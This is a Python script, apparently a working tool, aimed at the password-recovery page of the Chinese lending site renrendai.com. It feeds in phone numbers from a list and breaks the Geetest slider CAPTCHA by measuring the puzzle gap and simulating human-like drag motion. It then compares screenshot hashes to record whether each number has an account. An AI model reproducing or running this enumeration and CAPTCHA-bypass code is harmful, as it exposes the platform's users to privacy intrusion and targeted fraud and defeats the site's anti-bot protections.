#-*-  coding:utf-8 -*-
import imagehash
from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from PIL import Image
import time
import os


def edit_image(mobile, type):
    image_name = '%s.png' % mobile.strip()
    image = Image.open(image_name)
    if type is True:
        # 用户不存在
        region = (870, 190, 1045, 370)
    elif type is False:
        # 验证码
        region = (830, 407, 1081, 567)
    else:
        # 验证手机成功，输入验证码
        region = (730, 400, 1000, 550)
    crop = image.crop(region)
    crop.save('verify_%s' % image_name)


def verify_image(img1, img2):
    img1 = str(img1).strip() + ".png"
    img2 = str(img2).strip() + ".png"

    def cmpHash(hash1, hash2):
        n = 0
        if len(hash1) != len(hash2):
            return -1
        for i in range(len(hash1)):
            if hash1[i] != hash2[i]:
                n = n + 1
        return n

    hash1 = imagehash.average_hash(Image.open(img1))
    hash2 = imagehash.average_hash(Image.open(img2))
    res = cmpHash(str(hash1), str(hash2))
    print("图片相似度为：" + str(16 - res))
    if res >= 10:
        return False
    else:
        return True


def get_distance(image1, image2):
    threshold = 60
    left = 57
    for i in range(left, image1.size[0]):
        for j in range(image1.size[1]):
            rgb1 = image1.load()[i, j]
            rgb2 = image2.load()[i, j]
            res1 = abs(rgb1[0] - rgb2[0])
            res2 = abs(rgb1[1] - rgb2[1])
            res3 = abs(rgb1[2] - rgb2[2])
            if not (res1 < threshold and res2 < threshold and res3 < threshold):
                return i - 7
    return i - 11


def get_tracks(distance):
    v = 0
    t = 0.3
    tracks = []
    current = 0
    mid = distance * 4 / 5

    while current < distance:
        if current < mid:
            a = 2
        else:
            a = -3
        v0 = v
        s = v0 * t + 0.5 * a * (t ** 2)
        current += s
        tracks.append(round(s))
        v = v0 + a * t
    return tracks


def write_file(mobile, status):
    with open('verify_result_end.txt', 'a', encoding='utf-8') as a:
        a.write('%s,%s' % (mobile.strip(), status.strip()))
        a.write('\n')


def get_image(mobile):
    verify_mobile = 'verify_' + mobile
    image_name = '%s.png' % mobile.strip()
    driver = webdriver.PhantomJS(service_args=['--ignore-ssl-errors=true', '--ssl-protocol=TLSv1'])
    driver.set_window_size(1920, 1080)
    driver.get("https://www.renrendai.com/user/findpwd/index")
    driver.find_element_by_id("mobileOrEmail").send_keys(mobile.strip())
    time.sleep(1)
    driver.find_element_by_id("subNotLoginFindPswBt").click()
    time.sleep(1)
    driver.save_screenshot(image_name)

    # 2：验证是否有验证码
    edit_image(mobile.strip(), False)
    res = verify_image(verify_mobile, 'image_jiance_verify')
    if res is True:
        # 3：有验证码，需要破解
        print('有验证码，需要破解...')
        # 31：需要获取图片缺口得距离
        image_src = Image.open('%s.png' % verify_mobile.strip())
        image_dst = Image.open('image_backgroud.png')
        distance = get_distance(image_src, image_dst)
        print('需要移动得距离为：%s px' % str(distance))
        # 32：需要拖动滑动按钮到测出得距离处

        def verify_result(distance):
            # 33：模拟人的行为习惯（先匀加速拖动后匀减速拖动），把需要拖动的总距离分成一段一段小的轨迹
            tracks = get_tracks(distance)
            wait = WebDriverWait(driver, 10)

            # 34：按照轨迹拖动，完全验证
            button = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'geetest_slider_button')))
            ActionChains(driver).click_and_hold(button).perform()

            #for i in range:
            ActionChains(driver).move_by_offset(xoffset=distance, yoffset=0).perform()
            #else:
                #ActionChains(driver).move_by_offset(xoffset=3, yoffset=0).perform()
                #ActionChains(driver).move_by_offset(xoffset=-3, yoffset=0).perform()

            time.sleep(0.5)
            ActionChains(driver).release().perform()
            driver.save_screenshot('result01.png')
            time.sleep(1)
            driver.save_screenshot('result02.png')
            time.sleep(1)
            driver.save_screenshot('result03.png')
            time.sleep(1)
            driver.save_screenshot('result04.png')
            time.sleep(1)
            driver.save_screenshot('result05.png')

        verify_result(distance)
        # 验证是否是验证码，需要重新验证
        edit_image('result05', False)
        res = verify_image(verify_mobile, 'verify_result05')

        if res is True:
            print('破解验证码失败，返回重新加载......')
            print('------------')
            return False
        else:
            print('破解验证码成功，开始验证用户状态......')
            # geetest_slider_button class_name 托标
            # 35：有验证码，验证图片是否是用户不存在
            edit_image('result05', 'yes')
            res = verify_image('verify_result05', 'image_jiance_yes')
            if res is False:
                print('用户名不存在: %s' % mobile.strip())
                write_file(mobile, '否')
                return True
            elif res is True:
                print('注册过人人贷: %s' % mobile.strip())
                write_file(mobile, '是')
                return True

    elif res is False:
        # 4: 没有验证码，验证图片是否是用户不存在
        print('没有验证码，开始验证用户状态......')
        edit_image(mobile, 'yes')
        res = verify_image(verify_mobile, 'image_jiance_yes')
        if res is True:
            print('用户不存在: %s' % mobile.strip())
            write_file(mobile, '否')
            return True
        elif res is False:
            print('注册过人人贷: %s' % mobile.strip())
            write_file(mobile, '是')
            return True

    driver.quit()


def verify_mobile(mobile):
    # 1：获取网页截图
    return get_image(mobile.strip())


def main():
    import pandas as pd
    df = pd.read_table('mobile_list.txt', names=['mobile'])
    for index, row in df.iterrows():
        try:
            mobile = str(row["mobile"])
            print('-------------------------------------------------------')
            print('待验证的手机号码为：%s' % mobile)

            for r in range(0, 10):
                res = verify_mobile(str(mobile))
                if res is True:
                    break
                else:
                    continue
            os.remove('%s.png' % (mobile.strip()))
            os.remove('verify_%s.png' % (mobile.strip()))
            os.remove('verify_result05.png')
        except BaseException as e:
            print(e)
            continue


if __name__ == '__main__':
    main()
